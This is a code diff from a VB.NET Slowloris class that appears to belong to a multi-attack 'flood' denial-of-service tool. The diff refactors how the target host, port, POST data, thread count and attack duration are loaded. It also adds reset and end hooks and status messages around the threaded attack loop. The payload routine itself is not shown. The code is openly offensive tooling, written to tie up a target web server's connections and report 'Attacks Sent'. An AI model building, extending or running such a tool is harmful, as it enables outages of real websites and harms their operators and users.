@@ -17,19 +17,20 @@ Public Class SlowLoris
 
         If Not AttackRunning = True Then
             AttackRunning = True
-            HostToAttack = model.Host
-            Port = model.Port
-            PostDATA = model.PostDATA
-            ThreadstoUse = model.ThreadstoUse
-            TimetoAttack = model.Time
-            RandomFile = model.RandomFile
+            HostToAttack = model.newBaseFloodModel.Host
+            Port = model.newSlowLorisVariables.Port
+            PostDATA = model.newSlowLorisVariables.PostDATA
+            ThreadstoUse = model.newBaseFloodModel.ThreadstoUse
+            TimetoAttack = model.newBaseFloodModel.Time
+            RandomFile = model.newSlowLorisVariables.RandomFile
             If HostToAttack.Contains("http://") Then HostToAttack = HostToAttack.Replace("http://", String.Empty)
             If HostToAttack.Contains("www.") Then HostToAttack = HostToAttack.Replace("www.", String.Empty)
             If HostToAttack.Contains("/") Then HostToAttack = HostToAttack.Replace("/", String.Empty)
 
 
             Threads = New Thread(ThreadstoUse - 1) {}
-            GetFloodsBase().SetMessage("Slowloris attack")
+            GetFloodsBase().Reset()
+            GetFloodsBase().SetMessage("Slowloris attack started")
             For i As Integer = 0 To ThreadstoUse - 1
                 Threads(i) = New Thread(AddressOf DoWork)
                 Threads(i).IsBackground = True
@@ -49,6 +50,7 @@ Public Class SlowLoris
             AttackRunning = False
             GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & attacks.ToString)
             attacks = 0
+            GetFloodsBase().SetEnd()
         End If
 
     End Sub
